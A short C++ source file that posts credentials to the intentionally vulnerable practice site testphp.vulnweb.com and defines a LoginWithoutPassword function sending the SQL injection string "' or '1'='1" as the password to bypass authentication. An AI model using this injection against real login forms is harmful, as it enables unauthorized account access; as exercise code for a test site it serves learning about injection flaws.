#include "login.h"
#include <cpr/cpr.h>

const std::string urlAddress = "http://testphp.vulnweb.com/userinfo.php";
const std::string nameKey = "uname";
const std::string passKey = "pass";
const std::string injectionString = "' or '1'='1";

namespace testphp_login {

    PageOrError Login(std::string name, std::string password) {
        cpr::Url url{urlAddress};
        cpr::Payload payload{{nameKey, std::move(name)}, {passKey, std::move(password)}};
        cpr::Response response = cpr::Post(std::move(url), std::move(payload));
    
        if (response.status_code == cpr::status::HTTP_OK) {
            return response.text;
        }
        else {
            return response.status_code;
        }
    }
    
    PageOrError LoginWithoutPassword(std::string name) {
        return Login(std::move(name), injectionString);
    }
}
